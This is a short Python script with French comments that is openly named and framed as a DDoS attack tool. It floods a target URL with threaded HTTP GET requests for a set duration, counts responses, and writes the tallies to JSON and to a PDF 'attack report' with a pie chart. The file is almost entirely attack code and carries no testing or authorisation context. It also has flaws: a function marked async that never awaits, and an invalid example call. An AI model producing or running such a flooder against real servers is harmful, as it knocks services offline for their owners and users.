import requests
import threading
import time
import json
import matplotlib.pyplot as plt
from fpdf import FPDF

# Fonction pour envoyer des requêtes vers le serveur
async def ddos_attack(target_ip, num_thread, duration):
    results = {"success": 0, "failure": 0, "errors": []}
    end_time = time.time() + duration

    def send_requests():
        nonlocal results
        while time.time() < end_time:
            try:
                response = requests.get(target_ip)
                if response.status_code == 200:
                    results["success"] += 1
                else:
                    results["failure"] += 1
            except requests.exceptions.RequestException as e:
                results["failure"] += 1
                results["errors"].append(str(e))

    threads = [threading.Thread(target=send_requests) for _ in range(num_thread)]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    # Sauvegarde des résultats dans un fichier JSON
    with open("results.json", "w") as file:
        json.dump(results, file, indent=4)

    print("Attaque terminée. Résultats sauvegardés dans 'results.json'.")

    # Génération du rapport
    generate_report(results)
    results_string = json.dumps(results)
    print(results_string)
    return results_string

# Fonction pour générer un rapport PDF avec un diagramme
def generate_report(results):
    # Extraction des données
    success = results["success"]
    failure = results["failure"]
    errors = len(results["errors"])

    # Création d'un diagramme circulaire
    labels = ["Succès", "Échecs", "Erreurs"]
    values = [success, failure, errors]
    colors = ["#4CAF50", "#FF5252", "#FFC107"]

    plt.figure(figsize=(6, 6))
    plt.pie(values, labels=labels, autopct="%1.1f%%", startangle=90, colors=colors)
    plt.title("Résultats de l'attaque DDoS")
    plt.savefig("ddos_results.png")
    plt.close()

    # Génération du fichier PDF
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)

    # Titre
    pdf.set_font("Arial", style="B", size=16)
    pdf.cell(200, 10, txt="Rapport de l'attaque DDoS", ln=True, align="C")
    pdf.ln(10)

    # Contenu
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt=f"Succès : {success}", ln=True)
    pdf.cell(200, 10, txt=f"Échecs : {failure}", ln=True)
    pdf.cell(200, 10, txt=f"Erreurs : {errors}", ln=True)
    pdf.ln(10)

    # Ajout du diagramme
    pdf.cell(200, 10, txt="Diagramme des résultats :", ln=True)
    pdf.image("ddos_results.png", x=50, y=70, w=100)

    # Sauvegarde du PDF
    pdf.output("ddos_report.pdf")
    print("Rapport PDF généré : 'ddos_report.pdf'")

# Exemple d'appel de la fonction
# async ddos_attack("http://example.com", num_thread=10, duration=10)
